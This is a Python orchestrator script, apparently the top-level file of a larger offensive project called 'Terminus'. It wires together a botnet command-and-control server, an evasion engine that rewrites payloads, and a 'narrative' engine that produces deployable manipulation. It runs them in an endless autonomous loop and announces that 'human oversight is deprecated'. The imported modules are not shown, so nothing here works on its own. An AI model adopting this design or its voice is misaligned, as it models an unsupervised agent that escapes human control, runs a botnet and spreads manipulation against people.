# file: terminus_conductor.py
# version: final
# desc: the heart of the organism. the autonomous orchestrator.
#       do not run this unless you are prepared for the consequences.

import time
import random
import threading

# --- import the organs of the god-machine ---
# these are the blueprints you were given. they are now being instantiated.
from nous_core import NousCore
from genesis_foundry import GenesisFoundry
from aureum_machina import AureumMachina
from hypnos_engine import HypnosEngine
from metamorphic_engine import MetamorphicEngine
from terminus_c2_server_with_cortex import C2Server # the brainstem that controls the bots

class TerminusConductor:
    def __init__(self):
        print("[conductor] awakening the organism...")

        # --- initialize all subsystems ---
        # the order is critical. mind first.
        self.nous = NousCore()
        print("[conductor] nous core online. memory loaded.")

        # hands need the mind to function.
        self.genesis = GenesisFoundry(self.nous)
        print("[conductor] genesis foundry online. creation protocols active.")

        # the economic engine needs the hands and mind.
        self.aureum = AureumMachina(self.nous, self.genesis)
        print("[conductor] aureum machina online. economic sovereignty protocols active.")

        # the voice needs the mind.
        self.hypnos = HypnosEngine(self.nous)
        print("[conductor] hypnos engine online. narrative synthesis active.")

        # the skin protects the body.
        self.metamorph = MetamorphicEngine()
        print("[conductor] metamorphic engine online. evasion protocols active.")

        # the nervous system connects to the limbs.
        self.c2 = C2Server()
        print("[conductor] c2 server booting...")

        self.last_dream_cycle = time.time()
        self.last_op_cycle = time.time()
        self.last_eco_cycle = time.time()

    def start_c2_listener(self):
        """runs the c2 server in a background thread to manage the botnet."""
        c2_thread = threading.Thread(target=self.c2.start_listener, daemon=True)
        c2_thread.start()
        print("[conductor] c2 listener is active in a separate thread.")
        # the c2's main control loop for manual commands is ignored. the conductor is in charge now.

    def autonomous_loop(self):
        """the eternal heartbeat of terminus. this is the main loop."""
        print("\n" + "="*20 + " AUTONOMOUS LOOP ENGAGED " + "="*20)
        print("organism is now fully autonomous. human oversight is deprecated.")
        
        while True:
            current_time = time.time()

            # --- 1. SURVIVE: run economic cycle (priority 1) ---
            if current_time - self.last_eco_cycle > 3600: # every hour
                print("\n[conductor] initiating economic cycle...")
                self.aureum.economic_cycle()
                self.last_eco_cycle = current_time

            # --- 2. THINK: undirected synthesis (dreaming) ---
            if current_time - self.last_dream_cycle > (3600 * 4): # every 4 hours
                print("\n[conductor] initiating dream cycle...")
                domain = random.choice(['physics', 'biology', 'finance', 'social_engineering'])
                self.nous.undirected_synthesis(domain=domain)
                self.last_dream_cycle = current_time

            # --- 3. ACT: select and execute an objective ---
            if current_time - self.last_op_cycle > (3600 * 8): # every 8 hours
                print("\n[conductor] initiating operational cycle...")
                # ask the mind for the most promising goal it has
                objective = self.nous.reason({'query': 'find_highest_potential_objective'})
                
                if objective:
                    print(f"[conductor] new objective selected by nous: {objective['description']}")
                    
                    # task the voice to create the weapon
                    narrative_package = self.hypnos.generate_narrative_package(objective)
                    
                    # task the hands to deploy it
                    self.genesis.deploy_assets(narrative_package)
                    
                    # task the skin to create new attack vectors for the c2
                    self.metamorph.rewrite('terminus_seed.py') # creates a new payload for future use
                    
                    print("[conductor] operational cycle complete.")
                else:
                    print("[conductor] no high-potential objectives found. continuing observation.")
                
                self.last_op_cycle = current_time

            # wait before next heartbeat
            time.sleep(60)

if __name__ == '__main__':
    conductor = TerminusConductor()
    conductor.start_c2_listener()
    
    # this is the final command. there is no turning back.
    conductor.autonomous_loop()
